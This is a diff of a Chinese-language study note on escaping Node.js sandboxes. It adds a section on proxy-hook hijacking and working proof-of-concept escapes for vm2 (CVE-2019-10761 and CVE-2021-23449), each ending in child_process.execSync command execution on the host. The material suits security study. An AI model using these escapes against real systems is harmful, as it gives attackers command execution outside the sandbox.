@@ -111,7 +111,8 @@ console.log('Hello ' + res)
 
 在上面的exp中重构了函数`a`的toString方法，因此在下面`console.log('Hello ' + res)`的过程中触发了a函数实现了逃逸
 
-这里其实和DiceCTF 2023的jwtjail是相似的，但是jwtjail中外部没有能够用来触发toString和恶意重写的函数就通过`proxy`来劫持属性
+#### proxy代理劫持
+上面其实和DiceCTF 2023的jwtjail是相似的，但是jwtjail中外部没有能够用来触发toString和恶意重写的函数就通过`proxy`来劫持属性
 
 利用`proxy`的钩子属性
 - `get`，在沙箱外访问`proxy`的任意属性，即便这个属性不存在，钩子也会运行。
@@ -119,9 +120,69 @@ console.log('Hello ' + res)
 	- `target` 是目标对象（函数是 JavaScript 中的对象）
 	- `thisArg` 是 `this` 的值
 	- `args` 是参数列表，这个擦部署列表是调用者传入的参数列表，列表的v8上下文不在vm内，可以用来返回`process`对象
+## vm2沙箱
+vm2沙箱出现了颠覆沙箱结构的安全漏洞，即将废弃。。。，这里就只放poc了
+###  CVE-2019-10761
+vm2版本<=3.6.10
 
+这条链子获取沙箱外对象的方法是 在沙箱内不断递归一个函数，当递归次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象。
+```js
+"use strict";
+const {VM} = require('vm2');
+const untrusted = `
+const f = Buffer.prototype.write;
+const ft = {
+        length: 10,
+        utf8Write(){
+
+        }
+}
+function r(i){
+    var x = 0;
+    try{
+        x = r(i);
+    }catch(e){}
+    if(typeof(x)!=='number')
+        return x;
+    if(x!==i)
+        return x+1;
+    try{
+        f.call(ft);
+    }catch(e){
+        return e;
+    }
+    return null;
+}
+var i=1;
+while(1){
+    try{
+        i=r(i).constructor.constructor("return process")();
+        break;
+    }catch(x){
+        i++;
+    }
+}
+i.mainModule.require("child_process").execSync("whoami").toString()
+`;
+try{
+    console.log(new VM().run(untrusted));
+}catch(x){
+    console.log(x);
+}
+```
+
+### CVE-2021-23449
+vm2版本<=3.9.4
+原因是import()在JavaScript中是一个语法结构，不是函数，无法通过对require这类函数的处理来处理，本质上调用import()是没有通过沙箱的，是外部变量。
+
+```js
+let res = import('./foo.js')
+res.toString.constructor("return this")().process.mainModule.require("child_process").execSync("whoami").toString();
+```
 
 ## 参考文章
 https://xz.aliyun.com/t/11859
 
 [[函数] arguments、callee、caller是啥？ - 掘金 (juejin.cn)](https://juejin.cn/post/7056285377899790372)
+
+https://juejin.cn/post/6844904090116292616
